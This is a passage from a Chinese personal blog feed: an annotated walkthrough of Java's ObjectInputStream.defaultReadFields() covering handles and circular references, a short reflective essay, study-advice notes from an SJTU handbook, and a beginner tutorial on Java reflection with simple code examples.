class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">#ObjectInputStream.defaultReadFields()</span><br><span class="line"></span><br><span class="line">#基础类型字段和引用类型字段要分开处理，这前半部分就是对基础类型字段进行处理</span><br><span class="line">//传入两个参数，实现把当前类desc中定义的字段从输入流中读出来，分别写到对象obj里面</span><br><span class="line">    private void defaultReadFields(Object obj, ObjectStreamClass desc) throws IOException</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">//第一部分安全性检查，确保写入的对象obj确实是desc描述的类的实例，否则抛出异常</span><br><span class="line">        Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line"></span><br><span class="line">        if (cl != null &amp;&amp; obj != null &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line"></span><br><span class="line">            throw new ClassCastException();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">//第二部分，准备读取基本类型字段的数据块</span><br><span class="line">//计算所有基础类型字段一共占几个字节</span><br><span class="line">        int primDataSize = desc.getPrimDataSize();</span><br><span class="line">//用字节数组primVals来缓冲这些字段的原始数据，在primVals中恢复基本类型</span><br><span class="line">        if (primVals == null || primVals.length &lt; primDataSize) &#123;</span><br><span class="line"></span><br><span class="line">            primVals = new byte[primDataSize];//分配缓存区</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">//一次性读取所有基础字段，readFully()是底层读取函数，把这些字段的值逐个放进内存</span><br><span class="line">            bin.readFully(primVals, 0, primDataSize, false);</span><br><span class="line"></span><br><span class="line">//利用反射将primVals数据按照字段顺序和偏移写入到obj对象的字段中，设置基本类型字段的值，假设有int age = 18他就被从primVals中提取出来写入obj.age</span><br><span class="line">        if (obj != null) &#123;</span><br><span class="line"></span><br><span class="line">            desc.setPrimFieldValues(obj, primVals);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">#基础类型字段和引用类型字段要分开处理，这后半段就是处理引用类型字段</span><br><span class="line">//使用passHandle索引当前正在处理的引用类型对象在反序列化&quot;句柄表&quot;中的索引，为了用来构建&quot;对象图&quot;中的&quot;依赖边&quot;</span><br><span class="line">        int objHandle = passHandle;</span><br><span class="line">//getFields()返回的是所有字段的描述信息（ObjectStreamField[]包含名称、类型、偏移、是否共享等）,false表示只获取当前类的字段，不包括父类字段</span><br><span class="line">        ObjectStreamField[] fields = desc.getFields(false);</span><br><span class="line">        </span><br><span class="line">//只为引用类型字段开辟空间</span><br><span class="line">        Object[] objVals = new Object[desc.getNumObjFields()];</span><br><span class="line">        </span><br><span class="line">//计算引用字段在数组中的起始下标</span><br><span class="line">//`fields.length` 是所有字段总数（基本 + 引用类型）</span><br><span class="line">//`objVals.length` 是引用类型字段数量</span><br><span class="line">//`numPrimFields` 就是基本类型字段的个数</span><br><span class="line">//用于确定引用字段在 `fields[]` 中的起始位置</span><br><span class="line">        int numPrimFields = fields.length - objVals.length;</span><br><span class="line"></span><br><span class="line">//逐个读取引用字段</span><br><span class="line">        for (int i = 0; i &lt; objVals.length; i++) &#123;</span><br><span class="line">//跳过基础字段</span><br><span class="line">            ObjectStreamField f = fields[numPrimFields + i];</span><br><span class="line">            </span><br><span class="line"> // 递归反序列化引用字段，使用 objVals[i]承载每一个使用`readObject0(...)`从流中反序列化出的字段的值</span><br><span class="line">            objVals[i] = readObject0(f.isUnshared());//f.isUnshared()是一个flag，若为true表示该字段使用writeUnshared()写入，不能与其他字段共享对象引用(即不能产生共享图)</span><br><span class="line"></span><br><span class="line">//登记依赖关系，当前对象objHandle依赖在后半段开头的反序列化出来的字段对象passHandle，从而避免重反序列化和无尽递归死循环</span><br><span class="line">            if (f.getField() != null) &#123;</span><br><span class="line"></span><br><span class="line">                handles.markDependency(objHandle, passHandle);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">//写入对象字段到目标字段，和基本类型一样：把引用类型字段通过反射写入回目标对象</span><br><span class="line">//假设你反序列化出 `&quot;Alice&quot;`，它就被写入 `obj.name`</span><br><span class="line">        if (obj != null) &#123;</span><br><span class="line"></span><br><span class="line">            desc.setObjFieldValues(obj, objVals);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        //恢复passHandle状态，重置是为了继续处理下一个对象字段，确保流状态一致性</span><br><span class="line">        passHandle = objHandle;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#整体流程</span><br><span class="line">        ┌────────────┐</span><br><span class="line">        │ primVals[] │ ← bin.readFully() ← 序列化流（基础类型）</span><br><span class="line">        └────────────┘</span><br><span class="line">               │</span><br><span class="line">               ▼</span><br><span class="line">    setPrimFieldValues(obj, primVals)</span><br><span class="line"></span><br><span class="line">        ┌────────────┐</span><br><span class="line">        │ objVals[]  │ ← readObject0() ← 序列化流（引用类型）</span><br><span class="line">        └────────────┘</span><br><span class="line">               │</span><br><span class="line">               ▼</span><br><span class="line">    setObjFieldValues(obj, objVals)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="登记依赖"><a href="#登记依赖" class="headerlink" title="登记依赖"></a>登记依赖</h3><p>&#x2F;&#x2F;关于登记依赖关系再次举例说明，方便理解<br>&#x2F;&#x2F;它是 Java 反序列化机制中一个关键但常被忽略的部分，它直接关系到对象图的完整性、引用正确性以及循环引用支持（引用自文献）</p><p>handles.markDependency(objHandle, passHandle);<br>表示对象A（objHandle）依赖于对象 B（passHandle）当对象 B 还未完全反序列化完成时，系统会<br>先记录下来这个依赖关系，等 B 反序列化完成后，再回头通知 A。</p><p>这里有个如下类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class Node implements Serializable &#123;</span><br><span class="line">    String name;</span><br><span class="line">    Node next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//我这样构造对象</span><br><span class="line">Node a = new Node();</span><br><span class="line">Node b = new Node();</span><br><span class="line">a.name = &quot;A&quot;;</span><br><span class="line">b.name = &quot;B&quot;;</span><br><span class="line">a.next = b;</span><br><span class="line">b.next = a;  // 循环引用</span><br><span class="line"></span><br><span class="line">//结构变成了a &gt; b &gt; a</span><br><span class="line"></span><br><span class="line">//然后进行序列化</span><br><span class="line">ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;loop.ser&quot;));</span><br><span class="line">out.writeObject(a);</span><br><span class="line">out.close();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>假设我这里不登记依赖关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Object readObject() &#123;</span><br><span class="line">    Object obj = allocateNewObject();</span><br><span class="line"></span><br><span class="line">    for (Field f : obj.fields) &#123;</span><br><span class="line">        if (f.isPrimitive) &#123;</span><br><span class="line">            readPrimitiveValue(); // 没问题</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Object ref = readObject(); // 再次调用 readObject()</span><br><span class="line">            f.set(obj, ref);          // 设置字段</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么对象A所引用的B尚未完成反序列化却已经被访问(被调用了方法或者字段)，就会导致</p><ul><li>无限递归调用readObject()-&gt;栈溢出</li><li>对象字段引用错误，部分为null</li><li>更无法正确恢复对象图结构(如a  &gt; b &gt; a)</li></ul><p>第一次调用：<code>readObject()</code> 读取对象 a</p><ul><li>分配了一个新的对象 a</li><li>进入字段循环：<ul><li>读取 <code>a.name</code></li><li>遇到 <code>a.next = b</code> → 再次调用 <code>readObject()</code> 去读 b<br>  第二次调用：<code>readObject()</code> 读取对象 b</li></ul></li><li>分配了 b</li><li>进入字段循环：<ul><li>读取 <code>b.name</code></li><li>遇到 <code>b.next = a</code> → 再次调用 <code>readObject()</code> 去读 a（之前已经在读 a 了，但未完成）<br>  第三次调用：又来读 a</li></ul></li><li>分配新的 a（不记得之前的 a 了）</li><li>进入字段循环…</li><li>然后又会递归调用 b，再次递归调用 a…<br>结果：**无限递归 → 栈溢出 → <code>StackOverflowError</code></li></ul><p>而它是如何解决的呢<br>Java 在第一次遇到一个新对象时，不是立即 fully initialize，而是：</p><ol><li>分配一个句柄（handle）</li><li>将一个“未初始化状态”的对象挂在 handle 表上</li><li>等到该对象所有字段都完成后，才标记为“完成”</li><li>任何引用这个对象的其他对象，只要记录“依赖”，等它完成后就能接入引用图</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TC_OBJECT       → Node a (handle 0)</span><br><span class="line">    classdesc: Node</span><br><span class="line">    name: &quot;A&quot;</span><br><span class="line">    next:</span><br><span class="line">        TC_OBJECT   → Node b (handle 1)</span><br><span class="line">            classdesc: Node</span><br><span class="line">            name: &quot;B&quot;</span><br><span class="line">            next:</span><br><span class="line">                TC_REFERENCE → handle 0  (引用回 Node a)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即<mark>Java 不等对象构造完才加入引用表，而是边构建边挂句柄，允许后续字段引用回未完成对象</mark>。<br>构成依赖链环形图，Java 会在整个图构建完成后再调用所有 <code>readResolve()</code> 和 <code>validateObject()</code></p><p>此外不进行依赖登记也有可能反序列化时，readObject被恶意类重写，提早调用，访问一个尚未完全构造好的对象，会引发不一致甚至漏洞。所以必须明确谁依赖谁，等依赖的对象完成之后才允许继续使用或触发回调</p><h3 id="整体总结"><a href="#整体总结" class="headerlink" title="整体总结"></a>整体总结</h3><p>&#x2F;&#x2F;关于整体逻辑举例说明，方便理解<br>这里有个</p><ul><li>class User implements Serializable {<br>  private int id;<br>  private String name;<br>  private User friend;<br>}</li></ul><p>假设字段顺序为</p><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/7.png" class=""><ul><li><code>getFields(false)</code> 返回 <code>id</code>, <code>name</code>, <code>friend</code></li><li><code>getNumObjFields()</code> 返回 2 → 引用字段为 <code>name</code>, <code>friend</code></li><li>numPrimFields &#x3D; 3 - 2 &#x3D; 1</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// i = 0 -&gt; fields[1] -&gt; name</span><br><span class="line">// i = 1 -&gt; fields[2] -&gt; friend</span><br></pre></td></tr></table></figure><ul><li>把 <code>name</code> 和 <code>friend</code> 从流中读取出来</li><li>放进 <code>objVals[]</code></li><li>最后会统一通过 <code>desc.setObjFieldValues(obj, objVals)</code> 把这些值反射写回 <code>obj</code></li></ul><p>所以攻击者构造恶意链子的时候正是通过这里的readObject() → defaultReadObject() → defaultReadFields() → readObject0() → Gadget 调用链触发点注入恶意对象(恶意类，代理，URLClassLoader)</p><p>当然我们可以继续深入 <code>readObject0()</code> 的内部机制，所谓真正触发 gadget 链和调用栈的第一枪，不过就有些钻牛角尖了，便不再进一步深入说明。</p><h1 id="一点碎碎念"><a href="#一点碎碎念" class="headerlink" title="一点碎碎念"></a>一点碎碎念</h1><p>这是系统深入学习Java反序列化的第一步，所以有很多，看到哪学到哪，哪里不会点哪里的感觉。</p><p>但是学习总是从百草园到三味书屋，而后，百川东到海，海可纳百川的过程。</p><p>就像远古人是从动物,植物这种自然中进行模仿运用进而获得经验，所以越接近原始的威力越大但也越不讲究章法，就像一个新行业新事物的诞生，他的初期一定是野蛮生长却缺乏秩序的。到了中后期才会发展出礼仪秩序，才可以叫做文化与文明。</p><p><mark>虽然</mark>技术和社会事物发展有所不同，比如对知识肯定是由点到面而后明晰框架，而后融会贯通，而后推陈出新，不断发展，是一个个小循环套在大循环的过程，知识肯定不是孤立的吧。社会事物却有太多社会因素，政治因素以及别的不纯粹的东西的参杂。”有人的地方就有江湖”，比如诗经从远古混沌的表达人们的感情，再到唐诗宋词不断发展，到了后期却出现了八股，文字狱这样禁锢人们的思想的东西。</p><p>而技术却不会如此，是一个昂扬向上的过程，即便人会陷入思维僵化，可能无法推出更高的创新，那也是人的大脑所限制，是人力的渺小而非事物发展的伟力。再加之时代车轮的向前，更多人更多自然非自然要素的碰撞(比如新冠疫情的影响推动非预期预料的医学进步)，一定会出现更先进的技术。即便更高的文明或者行星撞地球这样的严重危险出现，短暂星球生命的落寞也不过是未来星球生命狂欢的前夜罢了，不过是等待又一春，循环着总会向前，是一个螺旋上升的过程。何况即便纳入更高文明的存在，你会发现它们依然逃不过这样的定律，高级文明也只是相对高级，在与其自身更低文明和更高文明的相处时，也不过是翻版的“地球”，不过是星际社会中高矮胖瘦穷富美丑的一个个人罢了。</p><p><mark>但是</mark>从长远来看，技术也不应该从社会事物中分开，文字狱实际上也只是分娩的阵痛，就像革命的胜利。是马克思主义所说生产力决定生产关系，生产关系反作用于生产力，尽管生产关系并不总是积极的，它对生产力也有促进或阻碍的反作用，但是一切事物总是向前发展的，尽管曲折但是必定向前。人们吃的饱了住的好了不可能不去考虑精神的富足，也是一个吐哺纳新，去除糟粕的过程。</p><p>说实话哪怕非物质文化遗产的消逝也只是社会淘汰的旧产品，人们对这一现象感到可惜也只是人们对于精神文化的追求罢了，而不是该项技术自身的问题，是这项技术不仅当前的形式适应不了社会的发展，也是社会的发展不太需要甚至不需要该项技术的助力。超级先进的文明大概率不会保留上古时期的古人类抬头望月低声吐出的神秘低吟，即便它很富有韵味，彼时彼刻又怎如此时此刻。</p><p>实际上，什么东西也不存在真正的消逝和消亡，事物总与周围的事物存在着联系，就像京剧的大杀四方是多剧种的合力变演，某些非遗也没有真正消逝，只要有人看到过，听到过，尝到过，闻到过，说到过。说白了，不可能有凭空出现，而天不知地不知你不知我不知的存在，她一定会流传下来，只不过换了种形式。</p><p>不过回到主题，一个人的一生与人类社会发展，与新旧事物更迭相比，肯定就是短期了，这也就是为什么我在刚开始差点陷入唯心主义错误的原因。不过也要反省自己，很多事物也不能什么都往宏大视角去看，小确幸也有小幸福，我们也不过是小小的一生，也所谓难得糊涂。</p><p>话不多说，祝大家学习愉快。                                                                                                                                                                                                                                      </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;选择原因：环境要求少&quot;&gt;&lt;a href=&quot;#选择原因：环境要求少&quot; class=&quot;headerlink&quot; title=&quot;选择原因：环境要求少&quot;&gt;&lt;/a&gt;选择原因：环境要求少&lt;/h1&gt;&lt;p&gt;&lt;mark&gt;少有的对环境没有什么要求的链子&lt;/mark&gt;&lt;br&gt;作用：被反序</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>上海交通大学生存手册随笔</title>
    <link href="https://usingns.github.io/2025/07/14/%E4%B8%8A%E6%B5%B7%E4%BA%A4%E9%80%9A%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C%E9%9A%8F%E7%AC%94/"/>
    <id>https://usingns.github.io/2025/07/14/%E4%B8%8A%E6%B5%B7%E4%BA%A4%E9%80%9A%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C%E9%9A%8F%E7%AC%94/</id>
    <published>2025-07-14T05:08:13.000Z</published>
    <updated>2025-07-14T05:29:46.015Z</updated>
    
    <content type="html"><![CDATA[<p>真正成为我们上课理由的，只有对知识的渴望</p><p>学习需要的不是悲壮的毅力，是对知识的渴求</p><p>平庸的生活方式是麻醉剂</p><p>我们必须一日三省，今天的时间是否过得有价值</p><blockquote><p>我们应该对计划时间下的工作量有足够认识。小到一小时、一天，大到个暑假、一个学期，或者是大学四年，制定切实可行的计划，并为不能完成计划自责是最基本的要求。所谓的牛人和大多数庸人的主要差别，一方面在于有没有时间可以利用;再一方面，就是时间的利用率。我们必须时刻保持一种紧迫感，以保证时间不被虚度。只要你能把在校期问的时问正确地加以利用。不需要超人的天分–甚至不需要特别努力，你都有望在你的专业领域里出类拔萃。<br>危险的。在科研这条道路上，只有对一门学科的喜爱，才能成为你唯一和全部的动力。这个喜爱不应当是抽象的，喜欢某门学科和喜欢某项运动从道理上很相似:比如你说喜欢篮球，你一定不会是因为看到那个球在地上滚就觉得很兴奋，而是因为你对篮球作为一项竞技运动有足够的了解，所以才喜欢打，或者喜欢看篮球。喜欢一个学科也是一样，无知的兴趣一定是苍白的。</p></blockquote><p>原创性思考</p><blockquote><p>脑海中勾勒出一个清晰的知识结构是每名研究人员自己的事。新进入研究领域的学生，必须学会如何自己归纳知识结构。如果有人问及你正在做的工作，你应该能像从 Google Earth 中找自己家一样，把自己的工作在一年、五年、十年、甚至整个世纪的时间尺度下，并且清晰、准确、不带偏见地勾勒出你正在做的工作在整个学科中的位置。可以说，清醒的位置感和准确的方向感，是比雄厚的基础知识更为重要的成功要素。<br>在研究中，知道做什么比知道怎样做更为重要<br>有很多同学在设计课上钻进了完美主义的死胡同。设计是工程，设计课更是工程。如果把课堂作业当成艺术的话，我不知道该说你幼稚还是愚蠢。要知道，方案设计永远没有尽头，但对一门设计课程作业，你的上限是<br>在同等工作量的前提下，明智的进度控制应该是把自己的全部工作平均分配在各次课上提交。即便你已经做完了更多，也必须像说评书一样娓娓道来，说一半藏一半，不要一股脑呈现完。因为不是所有同学都有新东西，所以我们更要保证每次上课都有新的东西给老师看，并注意和老师多加“探讨”。只要混个脸熟，你的印象分就会有很大提升。<br>在设计的最后阶段，尤其不要进行无谓的修改,不要把时问浪费在徒劳的心理抚慰上。即使老师提出了一些修改要求，你也没必要完全照办。把现有阶段的设计表现清楚，按时交图，这是想拿高分的基本要求。</p></blockquote><hr><p>小结：</p><ul><li><p>做真正对知识学习有帮助的事情，帮助越长远越值得去做</p></li><li><p>保证自己的原创性思考</p></li><li><p>在研究中，把握个人定位，自己走到了哪一步（位置感和方向感）和自己要如何走这步（时间利用率和计划与规划）</p></li><li><p>平庸的生活方式是麻醉剂，我们必须一日三省，今天的时间是否过得有价值</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;真正成为我们上课理由的，只有对知识的渴望&lt;/p&gt;
&lt;p&gt;学习需要的不是悲壮的毅力，是对知识的渴求&lt;/p&gt;
&lt;p&gt;平庸的生活方式是麻醉剂&lt;/p&gt;
&lt;p&gt;我们必须一日三省，今天的时间是否过得有价值&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们应该对计划时间下的工作量有足够认识。</summary>
      
    
    
    
    <category term="上海交通大学生存手册" scheme="https://usingns.github.io/categories/%E4%B8%8A%E6%B5%B7%E4%BA%A4%E9%80%9A%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/"/>
    
    
    <category term="note" scheme="https://usingns.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>反射机制</title>
    <link href="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <id>https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</id>
    <published>2025-04-03T03:07:50.000Z</published>
    <updated>2025-07-14T05:16:01.122Z</updated>
    
    <content type="html"><![CDATA[<ul><li>（抽象概念）RTTI（Run-Time Type Identification）运行时类型识别，主要两种方式<br>  传统的RTTI，我们编写知道所有的类型·<br>  反射机制，允许在运行时查询和操作类的信息<br>  太抽象了举例子<br>  正常写代码，一个类写出来</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class showclass &#123;  </span><br><span class="line">    String classname;  </span><br><span class="line">    //默认无参方法  </span><br><span class="line">    showclass() &#123;&#125;  </span><br><span class="line">    //有参方法  </span><br><span class="line">    showclass(String classname) &#123;  </span><br><span class="line">        //初始化  </span><br><span class="line">        this.classname = classname;  </span><br><span class="line">    &#125;  </span><br><span class="line">    void show() &#123;  </span><br><span class="line">        System.out.println(classname+&quot;:show&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">    //重载方法  </span><br><span class="line">    void show(String massage) &#123;  </span><br><span class="line">        System.out.println(classname+&quot;:&quot;+massage);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    @Override  </span><br><span class="line">    public String toString() &#123;  </span><br><span class="line">        return &quot;showclass&#123;&quot; +  </span><br><span class="line">                &quot;classname=&#x27;&quot; + classname + &#x27;\&#x27;&#x27; +  </span><br><span class="line">                &#x27;&#125;&#x27;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用（我已经知道类的信息了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        showclass showclass = new showclass(&quot;LiMing&quot;);  </span><br><span class="line">        showclass.show();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1.png" class=""><p>但是你不知道，程序只能靠运行时信息来发现，自然也就没法在编码阶段直接使用new来创建对象和使用对象，但是使用反射来使用showclass类是可以的</p><p>（资料）在sping中，就有反射来动态构造类和属性的使用</p><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/2.png" class=""><p>指定需要class，sping就会帮我们创建好并进行赋值</p><p>那使用反射来进行刚才的操作：<br>获取类，创建对象，属性赋值，调用方法<br>（想写的都在注释里面）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        //外部包可以是&quot;com.xxx.showclass&quot;,这里没有所以直接使用showclass  </span><br><span class="line">        //可能会出现找不到类的错误，把它放进异常里面  </span><br><span class="line">        Class c=Class.forName(&quot;showclass&quot;);  </span><br><span class="line">        //我们要如何根据c信息操作呢  </span><br><span class="line">        // 所有类都是继承自Object  </span><br><span class="line">        Object obj=c.newInstance();  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/3.png" class=""><p>但是想要传入message有参构造就不能使用newInstance()了，而且java9之后这个方法也被废弃了，我么可以使用getConstructor()获取构造器</p><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/4.png" class=""><p>接收的是一堆类型是因为重载</p><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/5.png" class=""><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/6.png" class=""><p>这种情况下会报错，说找不到方法，因为前面属性定义问题，如果换成public就可以了，但更改不是咱们说了算的，所以使用getgetDeclaredConstructor()方法获取所有的构造器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">  </span><br><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Class c=Class.forName(&quot;showclass&quot;);  </span><br><span class="line">  </span><br><span class="line">        Constructor cs=c.getDeclaredConstructor(String.class);  </span><br><span class="line">        Object o =  cs.newInstance(&quot;Jenny&quot;);  </span><br><span class="line">  </span><br><span class="line">        System.out.println(o);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行成功<br>想要修改一个类中的属性</p><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/7.png" class=""><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/8.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">  </span><br><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Class c=Class.forName(&quot;showclass&quot;);  </span><br><span class="line">  </span><br><span class="line">        Constructor cs=c.getDeclaredConstructor(String.class);  </span><br><span class="line">        Object o =  cs.newInstance(&quot;Jenny&quot;);  </span><br><span class="line">  </span><br><span class="line">        Field f=c.getDeclaredField(&quot;classname&quot;);  </span><br><span class="line">        f.setAccessible(true);  </span><br><span class="line">        f.set(o,&quot;Denny&quot;);  </span><br><span class="line">  </span><br><span class="line">        System.out.println(o);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过对属性权限的修改，然后修改属性的value<br>同样的如果想要获取方法，使用getMethods()获得public级别的方法，使用getDeclaredMethods()获取所有权限的方法</p><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/9.png" class=""><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/10.png" class=""><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/11.png" class=""><p>如果方法为私有，也可以同样的设置setAccessible(ture)来进行修改</p><p>以上为java反射机制的基础知识</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
